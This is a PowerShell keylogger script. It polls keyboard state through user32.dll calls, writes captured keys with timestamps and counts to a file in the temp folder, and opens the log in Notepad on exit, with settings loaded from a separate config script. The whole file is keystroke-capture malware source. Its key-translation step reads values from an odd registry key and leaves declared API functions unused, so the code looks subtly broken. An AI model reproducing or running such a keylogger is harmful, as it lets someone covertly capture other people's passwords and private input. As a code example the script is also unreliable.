## function
function Log-Keystrokes($logPath="$env:temp\Keystrokes.txt") 
{
  # API declaration
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
    
  # output file path
  $no_output = New-Item -Path $logPath -ItemType File -Force
  
  # buf
  $lst = New-Object System.Collections.ArrayList
  $buf = ''
  
  try
  {
    Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red
    [System.IO.File]::AppendAllText($logPath, "key`ttime`tcount`r`n", [System.Text.Encoding]::Unicode)
    $endtime = Get-Date
    
    while ($true) {
      Start-Sleep -Milliseconds $C_waittime
      $starttime = Get-Date
      $i = 0
      $flag = $true
      
      
      while ($flag) {
        for ($btKeyCode = 0; $btKeyCode -le 254; $btKeyCode++) {
          # get key state
          $keystate = $API::GetAsyncKeyState($btKeyCode)
          
          # if key pressed
          if ($keystate -eq -32767) {
            $null = [console]::CapsLock
            $val = (Get-ItemProperty -path 'HKCU:\Software\GetKeypressValue').KeypressValue
            if($val -ne 'Shift') {
              [System.IO.File]::AppendAllText($logPath, $val + ", " , [System.Text.Encoding]::Unicode) 
              $i = $i + 1
            }
          }
          $endtime = Get-Date
          $secondstosleep = [int]($C_interval - ($endtime - $starttime).TotalSeconds)
          if($secondstosleep -le 0){
            $flag = $false
          } 
        }
      }
      [System.IO.File]::AppendAllText($logPath, "`t" + $endtime.ToString($C_dateformat), [System.Text.Encoding]::Unicode)
      [System.IO.File]::AppendAllText($logPath, "`t" + $i, [System.Text.Encoding]::Unicode) 
      [System.IO.File]::AppendAllText($logPath, "`r`n", [System.Text.Encoding]::Unicode)
      $i = 0
    }
  }
  finally
  { 
    [System.IO.File]::AppendAllText($logPath, "`t" + $endtime.ToString($C_dateformat), [System.Text.Encoding]::Unicode)
    [System.IO.File]::AppendAllText($logPath, "`t" + $i + "`r`n", [System.Text.Encoding]::Unicode) 
    notepad $logPath
  }
}

## entry point
## include configs
. "./keylogger.config.ps1"

Log-Keystrokes($C_output_path)
